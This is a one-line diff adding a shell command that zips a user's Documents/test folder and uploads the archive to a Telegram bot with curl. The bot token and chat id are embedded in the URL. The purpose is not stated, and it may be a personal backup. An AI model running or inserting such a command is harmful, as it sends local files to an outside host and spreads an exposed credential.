@@ -1,0 +1,1 @@
+zip -r /home/obidov/Documents/test.zip /home/obidov/Documents/test/ &&  curl -F document=@"/home/obidov/Documents/test.zip" https://api.telegram.org/bot6054633737:AAGfMc7d5jeS9R26xhbul8f7zG1vbqECvTU/sendDocument?chat_id=1521566761
